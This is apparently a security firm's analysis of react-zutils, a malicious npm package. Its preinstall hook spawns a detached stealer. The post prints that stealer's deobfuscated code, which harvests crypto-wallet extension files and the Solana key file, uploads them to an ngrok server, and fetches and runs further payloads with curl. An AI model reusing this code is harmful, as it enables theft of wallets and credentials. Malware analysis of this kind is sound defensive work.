@@ -1,0 +1,269 @@
+
+On May 30, 2024 Phylum’s automated risk detection platform alerted us to a suspicious publication on npm. The package in question is called react-zutils and after digging into it, we found complex multi-stage obfuscated malware that uses multiple levels of redirection to steal crypto-related browser extension data. Additionally, it includes a keylogger and clipboard stealer and downloads and runs additional malware from their ngrok endpoint.
+
+react-vutils
+The Attack
+As usual, we’ll start this investigation in the package.json:
+{
+  "name": "react-zutils",
+  "version": "1.0.1",
+  "description": "All Utils for React App",
+  "main": "index.js",
+  "dependencies": {
+    "@babel/code-frame": "7.10.4",
+    "address": "1.1.2",
+    "browserslist": "4.14.2",
+    "chalk": "2.4.2",
+    "cross-spawn": "7.0.3",
+    "detect-port-alt": "1.1.6",
+    "escape-string-regexp": "2.0.0",
+    "filesize": "6.1.0",
+    "find-up": "4.1.0",
+    "fork-ts-checker-webpack-plugin": "4.1.6",
+    "global-modules": "2.0.0",
+    "globby": "11.0.1",
+    "gzip-size": "5.1.1",
+    "immer": "8.0.1",
+    "is-root": "2.1.0",
+    "loader-utils": "2.0.0",
+    "open": "^7.0.2",
+    "pkg-up": "3.1.0",
+    "prompts": "2.4.0",
+    "fs": "^0.0.1-security",
+    "path": "^0.12.7",
+    "child_process": "^1.0.2",
+    "crypto": "^1.0.1",
+    "request": "^2.88.2",
+    "sqlite3": "^5.1.6"
+  },
+  "scripts": {
+    "preinstall": "node launch.js",
+    "test": "echo \\"Error: no test specified\\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC"
+}
+We can see that it markets itself as an “All Utils for React App” and then goes on to list 25 dependencies. The most interesting bit here, however, is the preinstall hook. We can see that upon package install, it’s launching node launch.js. So let’s start there:
+const { spawn } = require('child_process');
+const path = require('path');
+
+// Path to the detached script
+const scriptPath = path.join(__dirname, 'setup-script.js');
+
+// Spawn a new detached process
+const subprocess = spawn('node', [scriptPath], {
+  detached: true,
+  stdio: 'ignore'
+});
+
+// Ensure the parent process doesn't wait for the detached process to complete
+subprocess.unref();
+This is pretty straightforward. After importing child_process and path it goes on to resolve the absolute path to another file called setup-script.js and then spawns that script in a new detached process, ignoring input, output, and error streams. Then, just for good measure, it uses the unref() method to ensure the parent process and child process are completely independent, allowing either to close without waiting for the other. Let’s check out setup-script.js:
+It turns out that this file is minified. It’s also highly obfuscated, but not in the traditional JavaScript obfuscation sense. Here’s a screenshot of what it looks like:
+image: gjj_images\phylum\20240708_170944_762599\Screenshot-2024-05-30-at-10.36.15-PM.png
+setup-script.js
+The obfuscation appears home-rolled and mostly involves complex decoding/decrypting of strings. Thankfully, they supply all the decoding/decrypting functions we need right in the code, so we can easily unroll this one. During the deobfuscation process I’ll also try to rename identifiers with sensible names so the entire thing is easier to read and reason about. Since this code is executed directly from the previous script, we’ll first search for the entry point in this one to see where we should start our investigation. In this case, we find a function down at the bottom originally called Ut() that’s called directly from the top level, so let’s check that out:
+const repeatInitialization = () => {
+  timestamp = Date.now();
+  (async () => {
+    osType = osType;
+    try {
+      const homeDirPath = replaceHomeDirPrefix("~/");
+      browserPaths.forEach(async (path, index) => {
+        let basePath = "";
+        basePath =
+          platform[0] === "d"
+            ? `${homeDirPath}${path[0]}`
+            : platform[0] === "l"
+            ? `${homeDirPath}${path[1]}`
+            : `${homeDirPath}${path[2]}`;
+        await collectAndUploadData(basePath, `${index}_`, index === 0);
+      });
+      if (platform[0] === "w") {
+        const edgeProfilePath = `${homeDirPath}${edgeUserDataPath}`;
+        await collectAndUploadData(edgeProfilePath, "3_", false);
+      }
+    } catch (processErr) {}
+  })();
+
+  (async () => {
+    await new Promise((resolve, reject) => {
+      if (platform[0] === "w") {
+        if (pathExists(`${homeDirectory}${pythonFilePath}`)) {
+          (async () => {
+            const pythonCommand = `"${homeDirectory}${pythonFilePath}" "${homeDirectory}${profileDirSuffix}"`;
+            try {
+              fs.rmSync(homeDirectory + profileDirSuffix);
+            } catch (rmErr) {}
+            httpRequest[getRequest](
+              `${baseURL}${clientDir}/${profilePathPrefix}`,
+              (err, response, body) => {
+                if (err) {
+                  initializeProcess();
+                } else {
+                  try {
+                    fs.writeFileSync(homeDirectory + profileDirSuffix, body);
+                    execCommand(pythonCommand, (err, stdout, stderr) => {
+                      initializeProcess();
+                    });
+                  } catch (writeFileErr) {
+                    initializeProcess();
+                  }
+                }
+              }
+            );
+          })();
+        } else {
+          initializeProcess();
+          handleTarFileDownload();
+        }
+      } else {
+        (async () => {
+          const pythonClientURL = `${baseURL}/client/${profilePathPrefix}`,
+            pythonClientPath = homeDirectory + profileDirSuffix;
+          const pythonCommand = `${pythonExecutable}3 "${pythonClientPath}"`;
+          httpRequest.get(pythonClientURL, (err, response, body) => {
+            if (err) {
+              resolve();
+            } else {
+              fs.writeFileSync(pythonClientPath, body);
+              execCommand(pythonCommand, (err, stdout, stderr) => {});
+              resolve();
+            }
+          });
+        })();
+      }
+    });
+  })();
+};
+I’ve renamed this function repeatInitialization for reasons that will be clear later. In this function, they first grab the current timestamp and then define two immediately invoked async functions. The first function steps through local Chrome, Brave, and Opera browser locations for Windows, macOS, and Linux machines:
+const browserPaths = [
+  [
+    "/Library/Application Support/Google/Chrome",
+    "/.config/google-chrome",
+    "/AppData/Local/Google/Chrome/User Data",
+  ],
+  [
+    "/Library/Application Support/BraveSoftware/Brave-Browser",
+    "/.config/BraveSoftware/Brave-Browser",
+    "/AppData/Local/BraveSoftware/Brave-Browser",
+  ],
+  [
+    "/Library/Application Support/com.operasoftware.Opera",
+    "/.config/opera",
+    "/AppData/Roaming/Opera Software/Opera Stable/User Data",
+  ],
+];
+If any of the paths are found it collects data from them and exfiltrates it to a remote server via ngrok. Here’s the collectAndUploadData function:
+const collectAndUploadData = async (browserPath, profilePrefix, includeSolanaId) => {
+  let basePath = browserPath;
+  if (!basePath || basePath === "") return [];
+  try {
+    if (!pathExists(basePath)) return [];
+  } catch {
+    return [];
+  }
+
+  let filesToUpload = [];
+  for (let i = 0; i < 200; i++) {
+    const profilePath = `${basePath}/${i === 0 ? defaultProfile : `${userProfile} ${i}`}/${localExtensionSettingsKey}`;
+    for (let j = 0; j < extensionIds.length; j++) {
+      const extensionId = extensionIds[j];
+      let extensionPath = `${profilePath}/${extensionId}`;
+      if (pathExists(extensionPath)) {
+        try {
+          const fileArray = fs[readDirSync](extensionPath);
+          fileArray.forEach((file) => {
+            const filePath = pathModule.join(extensionPath, file);
+            try {
+              if (filePath.includes(logExtension) || filePath.includes(ldbExtension)) {
+                filesToUpload.push({
+                  [fileValue]: fs.createReadStream(filePath),
+                  [fileOptions]: { [fileName]: `${profilePrefix}${i}_${extensionId}_${file}` },
+                });
+              }
+            } catch (fileErr) {}
+          });
+        } catch (readDirErr) {}
+      }
+    }
+  }
+
+  if (includeSolanaId) {
+    const solanaIdPath = `${homeDirectory}/.config/solana/id.json`;
+    if (pathExists(solanaIdPath)) {
+      try {
+        filesToUpload.push({
+          [fileValue]: fs.createReadStream(solanaIdPath),
+          [fileOptions]: { [fileName]: solanaIdFileName },
+        });
+      } catch (solanaIdErr) {}
+    }
+  }
+
+  const requestBody = { type: profilePathPrefix, hid: osType, name: hostname, [multiFile]: filesToUpload };
+  try {
+    const requestOptions = { [fileURL]: `${baseURL}${"/upload/"}`, [formData]: requestBody };
+    httpRequest[postRequest](requestOptions, (err, response, body) => {});
+  } catch (httpErr) {}
+
+  return filesToUpload;
+};
+It loops through up to user 200 profiles, looking specifically in the following extension folders:
+const extensionIds = [
+  "nkbihfbeogaeaoehlefnkodbefgpgknn", // Metamask Chrome
+  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // TronLink Chrome
+  "ejbalbakoplchlghecdalmeeeajnimhm", // MetaMask Edge
+  "fhbohimaelbohpjbbldcngcnapndodjp", // BNB Chrome
+  "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom Chrome
+  "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase Chrome
+  "fnjhmkhhmkbjkkabndcnnogagogbneec", // Ronin Chrome
+  "aeachknmefphepccionboohckonoeemg", // Coin98 Chrome
+  "hifafgmccdpekplomjjkcfgodnhcellj", // Crypto.com Chrome
+];
+If the extension folder is found, it searches for anything inside it with a .log or .ldb extension. These log and database files used by these extensions are not something you want stolen, especially from your crypto wallet extensions. It collects these files into the filesToUpload array. Then, it checks specifically if a Solana ID file was found and adds that to the upload list if so. Then, it prepares a request body and makes a POST request with machine info and the collected files to https://dfeb-66-154-105-3[.]ngrok-free[.]app/api/upload.
+Returning to the second async block, we see it first check if the system is Windows. If it is, it checks for the existence of a file called "/pyp/python.exe". If it does not exists, likely the case the first time this malware is run, it executes a initialization script:
+const initializeProcess = async () => {
+  const nodeVersion = process.version.match(/^v(\\d+\\.\\d+)/)[1];
+  const nodeStoreURL = `${baseURL}/node/${nodeVersion}`,
+    nodeStorePath = `${homeDirectory}/store.node`;
+
+  if (pathExists(nodeStorePath)) {
+    iterateBrowserPaths();
+  } else {
+    execCommand(`curl -Lo "${nodeStorePath}" "${nodeStoreURL}"`, (err, stdout, stderr) => {
+      iterateBrowserPaths();
+    });
+  }
+};
+This script downloads a tar archive from one of their ngrok endpoints https://dfeb-66-154-105-3[.]ngrok-free[.]app/api/node/${nodeVersion}. There are some mechanisms to check the size of the download and retry the process again if it decides something went wrong along the way. If a system other than Windows is detected, it’ll download their own Python client from another one of their endpoints.
+And with that, repeatInitialization completes. Outside this function back in the top level of setup-script.js, just after the repeatInitialization is called, we find this last snippet:
+let initializationInterval = setInterval(() => {
+  if (++intervalCounter < 5) repeatInitialization();
+  else clearInterval(initializationInterval);
+}, 6e5);
+This is a periodic execution mechanism set up by setInterval that ensures repeatInitialization is called every 6e5 ms (10 minutes) four times. If you recall, setup-scripts.js was spawned in detached mode from launch.js, so even after the package installation is complete and launch.js terminates, setup-setup.js will remain alive for another 40 minutes, periodically retrying to steal and exfiltrate the browser extension data and download the Python code and client.
+About Those Remote Files
+Recall from earlier that there are various places in this code where the attacker pulls other code from various endpoints. E.g. they have a pdown endpoint:
+const tarFileURL = `${baseURL}/pdown`,
+In attempting to grab these files, we found a 404 page from a Django backend with debug enabled:
+image: gjj_images\phylum\20240708_170944_762599\image--12-.png
+There’s a joke here somewhere about running DEBUG = True in “production”. Either way, some of the expected endpoints didn’t give us anything, but based on the message above, we extracted as much as we could from the URL patterns it told us about. Here’s what we were able to grab:
+
+brow: An encrypted Python script that looks very similar to what we already found above. It attempts to locate, decrypt, and exfiltrate sensitive browser extension log and database files, including login credentials and credit card information. The script deletes itself after execution.
+stk: An encrypted Python script that captures keystrokes and clipboard contents. It smartly buffers them and periodically sends them sends them to their keystroke endpoint.
+client: An encrypted Python script that’s responsible for downloading and executing brow and stk as silently as possible.
+keys: This is their exfiltration endpoint and accepts a POST request in brow to save the stolen credentials.
+After poking around a bit, it turns out that the keys endpoint also responds to GET requests by dumping all of its data to you without any required authentication 🤷 . This file we got back contains thousands of entries in the following form:
+origin_url : https: //couchdb.dev.dataunion.app/_utils/
+action_url : https: //couchdb.dev.dataunion.app/_utils/
+username : ---REDACTED---
+password : ---REDACTED---
+creation_time : 2023-07-07 14: 34: 17.514572
+last_time_used : 2023-09-01 10: 55: 35.384272
+At first, we thought we had stumbled upon all the victims’ credentials. However, upon deeper inspection, we think this might be some of the attacker’s data collected during testing or perhaps a mix of both. Regardless, if we do find legitimate stolen credentials, we will report them to the necessary parties.
+This Looks Familiar
+This isn’t the first time we’ve seen this malware. We wrote about it back in February of 2024. In that case, the attacker posted fake developer jobs around various job boards, and then, as part of the interview process, the attacker would get the candidates to download and execute the attacker-supplied code as part of a project. Whether this attack is related to that one, we can’t say for certain at this point. We do know that successful malware makes its rounds, even out in the open on GitHub, so this could just as easily be the same attacker or someone else just using that code. In either case, it’s definitely not something you want to run on your machine.
+Summary
+Once again, we discovered complex, multi-stage, obfuscated malware targeting developers' machines. Upon installation, the react-zutils package spawns a detached process that attempts to locate, collect, and exfiltrate sensitive data from several crypto wallet browser extensions, including Metamask, Phantom, and Coinbase. The malware specifically targets log and database files (.log and .ldb), which can contain private keys, seed phrases, and other sensitive information. It uploads these files and machine information to a remote server via an ngrok endpoint.
+Further investigation of the attacker's endpoints revealed additional malicious and encrypted Python scripts that capture keystrokes, clipboard data, and facilitate the silent execution of the malware. We also discovered what appears to be a dump of stolen credentials, potentially from victims or the attacker's own testing.
